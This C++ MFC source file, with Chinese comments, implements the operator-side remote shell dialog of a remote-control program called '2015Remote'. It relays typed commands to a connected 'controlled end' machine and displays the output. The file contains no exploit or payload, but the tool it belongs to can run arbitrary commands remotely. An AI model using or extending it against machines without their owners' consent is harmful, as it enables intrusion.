// ShellDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "2015Remote.h"
#include "ShellDlg.h"
#include "afxdialogex.h"

#define EDIT_MAXLENGTH 30000

BEGIN_MESSAGE_MAP(CAutoEndEdit, CEdit)
    ON_WM_CHAR()
END_MESSAGE_MAP()

void CAutoEndEdit::OnChar(UINT nChar, UINT nRepCnt, UINT nFlags)
{
    // 获取当前光标位置
    int nStart, nEnd;
    GetSel(nStart, nEnd);

    // 如果光标在最小可编辑位置之前，移动到末尾
    if (nStart < (int)m_nMinEditPos) {
        int nLength = GetWindowTextLength();
        SetSel(nLength, nLength);
    }

    // 调用父类处理输入字符
    CEdit::OnChar(nChar, nRepCnt, nFlags);
}

// CShellDlg 对话框

IMPLEMENT_DYNAMIC(CShellDlg, CDialog)

CShellDlg::CShellDlg(CWnd* pParent, Server* IOCPServer, CONTEXT_OBJECT *ContextObject)
    : DialogBase(CShellDlg::IDD, pParent, IOCPServer, ContextObject, IDI_ICON_SHELL)
{
}

CShellDlg::~CShellDlg()
{
}

void CShellDlg::DoDataExchange(CDataExchange* pDX)
{
    __super::DoDataExchange(pDX);
    DDX_Control(pDX, IDC_EDIT, m_Edit);
}


BEGIN_MESSAGE_MAP(CShellDlg, CDialog)
    ON_WM_CLOSE()
    ON_WM_CTLCOLOR()
    ON_WM_SIZE()
END_MESSAGE_MAP()


// CShellDlg 消息处理程序


BOOL CShellDlg::OnInitDialog()
{
    __super::OnInitDialog();
    m_nCurSel = 0;
    m_nReceiveLength = 0;
    SetIcon(m_hIcon, TRUE);
    SetIcon(m_hIcon,FALSE);

    CString str;
    str.FormatL("%s - 远程终端", m_IPAddress);
    SetWindowText(str);

    BYTE bToken = COMMAND_NEXT;
    m_ContextObject->Send2Client(&bToken, sizeof(BYTE));

    m_Edit.SetWindowTextA(">>");
    m_nCurSel = m_Edit.GetWindowTextLengthA();
    m_nReceiveLength = m_nCurSel;
    m_Edit.m_nMinEditPos = m_nReceiveLength;  // 设置最小可编辑位置
    m_Edit.SetSel((int)m_nCurSel, (int)m_nCurSel);
    m_Edit.PostMessage(EM_SETSEL, m_nCurSel, m_nCurSel);
    m_Edit.SetLimitText(EDIT_MAXLENGTH);

    return TRUE;  // return TRUE unless you set the focus to a control
    // 异常: OCX 属性页应返回 FALSE
}


VOID CShellDlg::OnReceiveComplete()
{
    if (m_ContextObject==NULL) {
        return;
    }

    AddKeyBoardData();
    m_nReceiveLength = m_Edit.GetWindowTextLength();
    m_Edit.m_nMinEditPos = m_nReceiveLength;  // 更新最小可编辑位置
}


#include <regex>
std::string removeAnsiCodes(const std::string& input)
{
    std::regex ansi_regex("\x1B\\[[0-9;]*[mK]");
    return std::regex_replace(input, ansi_regex, "");
}

// UTF-8 → ANSI(GBK) 转换，如果输入不是合法 UTF-8 则原样返回
static std::string Utf8ToLocal(const std::string& text)
{
    if (text.empty()) return text;
    // 尝试以 UTF-8 解码，MB_ERR_INVALID_CHARS 会让非法 UTF-8 失败
    int wLen = MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, text.c_str(), -1, NULL, 0);
    if (wLen <= 0) return text;  // 不是合法 UTF-8，原样返回（Windows 客户端 GBK 数据走这里）
    std::wstring wstr(wLen, 0);
    MultiByteToWideChar(CP_UTF8, 0, text.c_str(), -1, &wstr[0], wLen);
    int aLen = WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    if (aLen <= 0) return text;
    std::string ansi(aLen, 0);
    WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), -1, &ansi[0], aLen, NULL, NULL);
    if (!ansi.empty() && ansi.back() == '\0') ansi.pop_back();
    return ansi;
}

VOID CShellDlg::AddKeyBoardData(void)
{
    // 最后填上0

    //Shit\0
    m_ContextObject->InDeCompressedBuffer.WriteBuffer((LPBYTE)"", 1);           //从被控制端来的数据我们要加上一个\0
    Buffer tmp = m_ContextObject->InDeCompressedBuffer.GetMyBuffer(0);
    bool firstRecv = tmp.c_str() == std::string(">");
    std::string cleaned = removeAnsiCodes(tmp.c_str());
    std::string converted = Utf8ToLocal(cleaned);  // Linux 客户端 UTF-8 → GBK；Windows 客户端原样通过
    CString strResult = firstRecv ? "" : CString("\r\n") + converted.c_str();

    //替换掉原来的换行符  可能cmd 的换行同w32下的编辑控件的换行符不一致   所有的回车换行
    strResult.Replace("\n", "\r\n");

    if (strResult.GetLength() + m_Edit.GetWindowTextLength() >= EDIT_MAXLENGTH) {
        CString text;
        m_Edit.GetWindowTextA(text);
        auto n = EDIT_MAXLENGTH - strResult.GetLength() - 5; // 留5个字符输入clear清屏
        if (n < 0) {
            strResult = strResult.Right(strResult.GetLength() + n);
        }
        m_Edit.SetWindowTextA(text.Right(max(n, 0)));
    }

    //得到当前窗口的字符个数
    int	iLength = m_Edit.GetWindowTextLength();    //kdfjdjfdir
    //1.txt
    //2.txt
    //dir\r\n

    //将光标定位到该位置并选中指定个数的字符  也就是末尾 因为从被控端来的数据 要显示在 我们的 先前内容的后面
    m_Edit.SetSel(iLength, iLength);

    //用传递过来的数据替换掉该位置的字符    //显示
    m_Edit.ReplaceSel(strResult);

    //重新得到字符的大小

    m_nCurSel = m_Edit.GetWindowTextLength();

    //我们注意到，我们在使用远程终端时 ，发送的每一个命令行 都有一个换行符  就是一个回车
    //要找到这个回车的处理我们就要到PreTranslateMessage函数的定义
}

void CShellDlg::OnClose()
{
    CancelIO();
    // 等待数据处理完毕
    if (IsProcessing()) {
        ShowWindow(SW_HIDE);
        return;
    }

    DialogBase::OnClose();
}


CString ExtractAfterLastNewline(const CString& str)
{
    int nPos = str.ReverseFind(_T('\n'));
    if (nPos != -1) {
        return str.Mid(nPos + 1);
    }

    nPos = str.ReverseFind(_T('\r'));
    if (nPos != -1) {
        return str.Mid(nPos + 1);
    }

    return str;
}


BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
{
    if (pMsg->message == WM_KEYDOWN) {
        // 屏蔽VK_ESCAPE、VK_DELETE
        if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
            return true;
        //如果是可编辑框的回车键
        if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_Edit.m_hWnd) {
            //得到窗口的数据大小
            int	iLength = m_Edit.GetWindowTextLength();
            CString str;
            //得到窗口的字符数据
            m_Edit.GetWindowText(str);
            //加入换行符
            str += "\r\n";
            //得到整个的缓冲区的首地址再加上原有的字符的位置，其实就是用户当前输入的数据了
            //然后将数据发送出去
            LPBYTE pSrc = (LPBYTE)str.GetBuffer(0) + m_nCurSel;
#ifdef _DEBUG
            TRACE("[Shell]=> %s", (char*)pSrc);
#endif
            if (0 == strcmp((char*)pSrc, "exit\r\n")) { // 退出终端
                return PostMessage(WM_CLOSE);
            } else if (0 == strcmp((char*)pSrc, "clear\r\n")) { // 清理终端
                str = ExtractAfterLastNewline(str.Left(str.GetLength() - 7));
                m_Edit.SetWindowTextA(str);
                m_nCurSel = m_Edit.GetWindowTextLength();
                m_nReceiveLength = m_nCurSel;
                m_Edit.m_nMinEditPos = m_nReceiveLength;  // 更新最小可编辑位置
                m_Edit.SetSel(m_nCurSel, m_nCurSel);
                return TRUE;
            }
            int length = str.GetLength() - m_nCurSel;
            m_ContextObject->Send2Client(pSrc, length);
            m_nCurSel = m_Edit.GetWindowTextLength();
        }
        // 限制VK_BACK
        if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_Edit.m_hWnd) {
            if (m_Edit.GetWindowTextLength() <= m_nReceiveLength)
                return true;
        }
        // 限制VK_LEFT - 不能移动到历史输出区域
        if (pMsg->wParam == VK_LEFT && pMsg->hwnd == m_Edit.m_hWnd) {
            int nStart, nEnd;
            m_Edit.GetSel(nStart, nEnd);
            if (nStart <= (int)m_nReceiveLength)
                return true;
        }
        // 限制VK_UP - 禁止向上移动到历史输出
        if (pMsg->wParam == VK_UP && pMsg->hwnd == m_Edit.m_hWnd) {
            return true;
        }
        // 限制VK_HOME - 移动到当前命令行开始位置而不是文本开头
        if (pMsg->wParam == VK_HOME && pMsg->hwnd == m_Edit.m_hWnd) {
            m_Edit.SetSel((int)m_nReceiveLength, (int)m_nReceiveLength);
            return true;
        }
    }

    return __super::PreTranslateMessage(pMsg);
}


HBRUSH CShellDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
    HBRUSH hbr = __super::OnCtlColor(pDC, pWnd, nCtlColor);

    if ((pWnd->GetDlgCtrlID() == IDC_EDIT) && (nCtlColor == CTLCOLOR_EDIT)) {
        COLORREF clr = RGB(255, 255, 255);
        pDC->SetTextColor(clr);   //设置白色的文本
        clr = RGB(0,0,0);
        pDC->SetBkColor(clr);     //设置黑色的背景
        return CreateSolidBrush(clr);  //作为约定，返回背景色对应的刷子句柄
    } else {
        return __super::OnCtlColor(pDC, pWnd, nCtlColor);
    }
    return hbr;
}


void CShellDlg::OnSize(UINT nType, int cx, int cy)
{
    __super::OnSize(nType, cx, cy);

    if (!m_Edit.GetSafeHwnd()) return; // 确保控件已创建

    // 计算新位置和大小
    CRect rc;
    m_Edit.GetWindowRect(&rc);
    ScreenToClient(&rc);

    // 重新设置控件大小
    m_Edit.MoveWindow(0, 0, cx, cy, TRUE);
}
